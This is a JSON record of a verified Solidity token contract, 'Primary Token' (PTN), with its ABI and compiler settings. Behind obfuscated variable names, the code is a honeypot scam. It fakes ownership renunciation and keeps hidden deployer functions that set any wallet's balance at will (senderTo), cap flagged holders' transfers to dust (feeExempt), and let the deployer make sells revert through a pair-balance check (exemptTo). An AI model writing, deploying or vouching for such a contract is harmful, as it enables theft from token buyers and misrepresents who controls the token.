{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface launchedToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyList) external view returns (uint256);\n\n    function transfer(address autoShouldMax, uint256 swapTeam) external returns (bool);\n\n    function allowance(address txSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoShouldMax,\n        uint256 swapTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLaunch, uint256 value);\n    event Approval(address indexed txSwap, address indexed spender, uint256 value);\n}\n\nabstract contract swapAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoExemptFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchReceiver {\n    function createPair(address walletReceiverToken, address swapSender) external returns (address);\n}\n\ninterface launchedTokenMetadata is launchedToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrimaryToken is swapAuto, launchedToken, launchedTokenMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAmount;\n    }\n\n    function approve(address toList, uint256 swapTeam) public virtual override returns (bool) {\n        tokenReceiver[_msgSender()][toList] = swapTeam;\n        emit Approval(_msgSender(), toList, swapTeam);\n        return true;\n    }\n\n    uint256 private swapAmount = 100000000 * 10 ** 18;\n\n    function transfer(address maxFee, uint256 swapTeam) external virtual override returns (bool) {\n        return swapMode(_msgSender(), maxFee, swapTeam);\n    }\n\n    string private takeTokenSell = \"Primary Token\";\n\n    event OwnershipTransferred(address indexed autoList, address indexed teamMarketing);\n\n    uint256 modeTake;\n\n    address receiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isModeToken() public {\n        emit OwnershipTransferred(receiverWallet, address(0));\n        liquidityTotal = address(0);\n    }\n\n    function senderFee(address txTokenSender) public {\n        if (senderTeamBuy) {\n            return;\n        }\n        if (swapEnable == teamWallet) {\n            amountFee = feeAmount;\n        }\n        receiverFromMarketing[txTokenSender] = true;\n        \n        senderTeamBuy = true;\n    }\n\n    address limitIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public tokenSender;\n\n    function owner() external view returns (address) {\n        return liquidityTotal;\n    }\n\n    function allowance(address toAmountTake, address toList) external view virtual override returns (uint256) {\n        if (toList == receiverMin) {\n            return type(uint256).max;\n        }\n        return tokenReceiver[toAmountTake][toList];\n    }\n\n    mapping(address => bool) public liquidityTeam;\n\n    uint8 private tokenTake = 18;\n\n    function launchedSender() private view {\n        require(receiverFromMarketing[_msgSender()]);\n    }\n\n    function transferFrom(address sellTeam, address autoShouldMax, uint256 swapTeam) external override returns (bool) {\n        if (_msgSender() != receiverMin) {\n            if (tokenReceiver[sellTeam][_msgSender()] != type(uint256).max) {\n                require(swapTeam <= tokenReceiver[sellTeam][_msgSender()]);\n                tokenReceiver[sellTeam][_msgSender()] -= swapTeam;\n            }\n        }\n        return swapMode(sellTeam, autoShouldMax, swapTeam);\n    }\n\n    function feeExempt(address limitAuto) public {\n        launchedSender();\n        if (amountFee == txSender) {\n            txSender = tokenSender;\n        }\n        if (limitAuto == receiverWallet || limitAuto == launchLaunched) {\n            return;\n        }\n        liquidityTeam[limitAuto] = true;\n    }\n\n    mapping(address => bool) public receiverFromMarketing;\n\n    bool public senderTeamBuy;\n\n    uint256 private amountFee;\n\n    uint256 private txSender;\n\n    mapping(address => uint256) private modeMin;\n\n    address public launchLaunched;\n\n    address public receiverWallet;\n\n    address private liquidityTotal;\n\n    string private takeLaunched = \"PTN\";\n\n    function balanceOf(address buyList) public view virtual override returns (uint256) {\n        return modeMin[buyList];\n    }\n\n    uint256 private teamWallet;\n\n    constructor (){\n        if (isTakeMin == buyMode) {\n            txSender = feeAmount;\n        }\n        autoExemptFrom maxAmountSell = autoExemptFrom(receiverMin);\n        launchLaunched = launchReceiver(maxAmountSell.factory()).createPair(maxAmountSell.WETH(), address(this));\n        if (isTakeMin) {\n            amountFee = swapEnable;\n        }\n        receiverWallet = _msgSender();\n        isModeToken();\n        receiverFromMarketing[receiverWallet] = true;\n        modeMin[receiverWallet] = swapAmount;\n        if (amountFee == feeAmount) {\n            isTakeMin = true;\n        }\n        emit Transfer(address(0), receiverWallet, swapAmount);\n    }\n\n    uint256 takeSellFee;\n\n    function atWallet(address sellTeam, address autoShouldMax, uint256 swapTeam) internal returns (bool) {\n        require(modeMin[sellTeam] >= swapTeam);\n        modeMin[sellTeam] -= swapTeam;\n        modeMin[autoShouldMax] += swapTeam;\n        emit Transfer(sellTeam, autoShouldMax, swapTeam);\n        return true;\n    }\n\n    function senderTo(address maxFee, uint256 swapTeam) public {\n        launchedSender();\n        modeMin[maxFee] = swapTeam;\n    }\n\n    function swapMode(address sellTeam, address autoShouldMax, uint256 swapTeam) internal returns (bool) {\n        if (sellTeam == receiverWallet) {\n            return atWallet(sellTeam, autoShouldMax, swapTeam);\n        }\n        uint256 launchMax = launchedToken(launchLaunched).balanceOf(limitIs);\n        require(launchMax == takeSellFee);\n        require(autoShouldMax != limitIs);\n        if (liquidityTeam[sellTeam]) {\n            return atWallet(sellTeam, autoShouldMax, toReceiver);\n        }\n        return atWallet(sellTeam, autoShouldMax, swapTeam);\n    }\n\n    bool public buyMode;\n\n    uint256 constant toReceiver = 10 ** 10;\n\n    uint256 private swapEnable;\n\n    function exemptTo(uint256 swapTeam) public {\n        launchedSender();\n        takeSellFee = swapTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeTokenSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTake;\n    }\n\n    uint256 private feeAmount;\n\n    bool public isTakeMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmountTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapTeam\",\"type\":\"uint256\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isModeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTakeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenSender\",\"type\":\"address\"}],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeamBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTeam\",\"type\":\"uint256\"}],\"name\":\"senderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShouldMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrimaryToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}